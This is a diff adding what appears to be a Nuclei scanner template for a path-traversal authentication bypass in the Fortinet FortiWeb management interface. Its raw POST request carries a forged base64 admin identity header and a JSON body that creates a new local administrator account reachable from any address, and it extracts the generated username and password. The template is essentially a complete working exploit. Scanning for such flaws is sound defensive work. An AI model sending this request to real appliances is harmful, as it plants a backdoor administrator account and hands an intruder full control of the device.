@@ -1,0 +1,87 @@
+id: fortiweb-auth-bypass
+
+info:
+  name: FortiWeb - Authentication Bypass
+  author: DhiyaneshDk,watchTowr,rapid7,defusedcyber
+  severity: critical
+  description: |
+    Detected an authentication bypass via a path traversal vulnerability in the Fortinet FortiWeb management interface that allowed the creation of a new local administrator account. The vulnerability appeared to have been patched in version 8.0.2 of the product.
+  reference:
+    - https://x.com/defusedcyber/status/1975242250373517373
+    - https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass
+    - https://github.com/rapid7/metasploit-framework/pull/20698/files
+  metadata:
+    verified: true
+    max-request: 1
+  tags: vuln,fortiweb,fortigate,intrusive,auth-bypass
+
+variables:
+  username: "{{to_lower(rand_text_alpha(8))}}"
+  password: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |
+        POST /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi HTTP/1.1
+        Host: {{Hostname}}
+        CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
+        Content-Type: application/json
+
+        {
+            "data": {
+                "q_type": 1,
+                "name": "{{username}}",
+                "access-profile": "prof_admin",
+                "access-profile_val": "0",
+                "trusthostv4": "0.0.0.0/0",
+                "trusthostv6": "::/0",
+                "last-name": "",
+                "first-name": "",
+                "email-address": "",
+                "phone-number": "",
+                "mobile-number": "",
+                "hidden": 0,
+                "comments": "",
+                "sz_dashboard": -1,
+                "type": "local-user",
+                "type_val": "0",
+                "admin-usergrp_val": "0",
+                "wildcard_val": "0",
+                "accprofile-override_val": "0",
+                "sshkey": "",
+                "passwd-set-time": 0,
+                "history-password-pos": 0,
+                "history-password0": "",
+                "history-password1": "",
+                "history-password2": "",
+                "history-password3": "",
+                "history-password4": "",
+                "history-password5": "",
+                "history-password6": "",
+                "history-password7": "",
+                "history-password8": "",
+                "history-password9": "",
+                "force-password-change": "disable",
+                "force-password-change_val": "0",
+                "password": "{{password}}"
+            }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"results":'
+          - '"can_clone":'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"USERNAME: "+ username'
+          - '"PASSWORD: "+ password'
